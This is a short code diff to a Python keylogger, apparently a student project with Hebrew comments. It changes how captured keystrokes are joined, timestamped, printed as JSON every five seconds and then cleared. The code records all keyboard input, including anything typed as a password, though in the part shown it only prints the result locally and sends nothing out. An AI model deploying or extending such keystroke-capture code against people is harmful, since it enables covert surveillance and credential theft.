@@ -28,23 +28,24 @@ class IKeylogger:
         self.listener = keyboard.Listener(on_press=self.on_press)
         self.listener.start()
 
+
+
 class AddToFile(IKeylogger):
     def __init__(self):
         super().__init__()
         self.timestamps = []
 
-# מוסיף את הזמן כול 5 שניות,גם אם הוא לא כתב כלום
-    def update_timestamp(self):
-        self.timestamps.append(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-        threading.Timer(5, self.update_timestamp).start()
 
 # מדפיס את הjson כול 5 שניות
     def print_json(self):
         if self.my_list:
-            print(json.dumps({"keys": self.my_list, "timestamps": self.timestamps}))
+            combined_keys = "".join(self.my_list)
+            self.timestamps.append(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
+            print(json.dumps({"timestamps": self.timestamps, "keys": combined_keys}))
         threading.Timer(5, self.print_json).start()
+        self.my_list = []
+        self.timestamps = []
 
 keylogger = AddToFile()
 keylogger.start_logging()
-keylogger.update_timestamp()
 keylogger.print_json()
